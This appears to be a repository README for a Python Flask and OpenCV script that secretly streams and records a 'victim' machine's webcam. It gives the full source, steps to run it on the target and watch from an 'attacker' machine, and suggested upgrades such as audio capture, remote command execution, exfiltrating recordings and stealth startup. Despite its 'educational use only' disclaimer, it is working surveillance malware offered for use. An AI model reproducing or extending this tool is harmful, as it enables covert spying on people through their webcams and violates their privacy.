📷 Python Remote Webcam Stream & Recorder (Educational Use Only)

    ⚠️ Disclaimer:
    This tool is created for educational and ethical purposes only.
    Do NOT use this on any device you don't own or have explicit permission to test.
    Unauthorized use may be illegal and punishable by law.

🧠 Overview

This is a simple Python-based script that captures live video from a device’s webcam, streams it in real-time over the network, and records it locally on the device.

It can be used for:

    Ethical hacking labs

    Red Team simulations

    Educational malware development

    Remote surveillance in CTF-like environments

🛠 Features

✅ Live webcam streaming over HTTP
✅ Local video recording (.avi)
✅ Lightweight Flask server
✅ Works on Windows/Linux
✅ Perfect for lab testing (with a virtual victim machine)
🚀 How It Works

    The script uses OpenCV to access the webcam.

    It starts a Flask server that hosts the stream on http://<victim-ip>:8080.

    It simultaneously saves the stream as a local .avi video file on the target device.

📄 Source Code

from flask import Flask, Response
import cv2

app = Flask(__name__)

# Initialize webcam (0 = default camera)
cap = cv2.VideoCapture(0)

# Set up video recorder
fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter('recorded.avi', fourcc, 20.0, (640, 480))

def generate_frames():
    while True:
        success, frame = cap.read()
        if not success:
            break
        else:
            # Save the frame
            out.write(frame)

            # Encode frame as JPEG
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()

            # Yield the frame for streaming
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

@app.route('/')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

💻 Requirements

Install dependencies on the victim machine:

pip install flask opencv-python

🌐 Usage

    Run the script on the target machine:

python run_on_target.py

On your attacker/viewer machine, open a browser and navigate to:

    http://<target-ip>:8080

    You will see a live stream from the victim’s webcam.
    The stream is also saved as recorded.avi on the victim device.

🔐 Optional Enhancements

You can extend this tool with:

    Audio capture (via pyaudio)

    Authentication (basic auth for viewing)

    Remote command execution

    Sending recorded files back to attacker

    Stealth (run in background on startup)

📚 Educational Intent

This project is a part of ethical hacking practice and malware simulation development.
It’s intended for:

    Penetration testing students

    Red Team operators

    CTF builders

    Cybersecurity researchers

Always use in controlled environments only.
👨‍💻 Author

Made with 💻 for cybersecurity learning.
Feel free to fork, improve, and experiment responsibly.
